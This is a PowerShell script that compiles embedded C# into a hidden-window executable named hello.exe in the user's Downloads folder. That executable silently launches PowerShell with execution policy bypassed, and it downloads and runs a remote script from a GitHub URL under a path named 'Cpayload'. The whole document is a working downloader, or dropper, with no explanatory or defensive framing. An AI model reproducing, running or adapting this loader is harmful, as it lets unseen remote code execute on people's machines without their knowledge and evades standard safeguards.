$source  = @" 
using System;
using System.Diagnostics;

namespace PowerShellExecution
{
    class Program
    {
        static void Main()
        {
            string url = "https://raw.githubusercontent.com/43a1723/test/main/Extras/Cpayload/main.ps1";
            string psCommand = $"iex (iwr {url} -UseBasicP)";

            ProcessStartInfo startInfo = new ProcessStartInfo
            {
                FileName = "powershell.exe",
                Arguments = $"-NoProfile -ExecutionPolicy Bypass -Command \"{psCommand}\"",
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };

            using (Process process = Process.Start(startInfo))
            {
                // Output and error streams can be captured if needed
                string output = process.StandardOutput.ReadToEnd();
                string error = process.StandardError.ReadToEnd();
                process.WaitForExit();

                // Optionally, you can log or process the output and error
                // Console.WriteLine(output); // Uncomment to see the output
                // Console.WriteLine(error);  // Uncomment to see any errors
            }
        }
    }
}
"@
$outpath  =  "$env:userprofile\downloads\hello.exe" 
$dict = new-object 'System.Collections.Generic.Dictionary[string,string]' 
$dict.Add('CompilerVersion','v4.0')
$CsharpCompiler = New-Object Microsoft.CSharp.CSharpCodeProvider $dict
$CompilerParametres = New-Object System.CodeDom.Compiler.CompilerParameters
$CompilerParametres.ReferencedAssemblies.Add("System.dll")
$CompilerParametres.ReferencedAssemblies.Add("System.Windows.Forms.dll")
$CompilerParametres.IncludeDebugInformation = $false
$CompilerParametres.GenerateExecutable = $true
$CompilerParametres.GenerateInMemory = $false
$CompilerParametres.OutputAssembly  =  $outpath 
$CompilerParametres.CompilerOptions += "/platform:X86 /unsafe /target:winexe"
$result = $CsharpCompiler.CompileAssemblyFromSource($CompilerParametres, $source) 
$result  
 
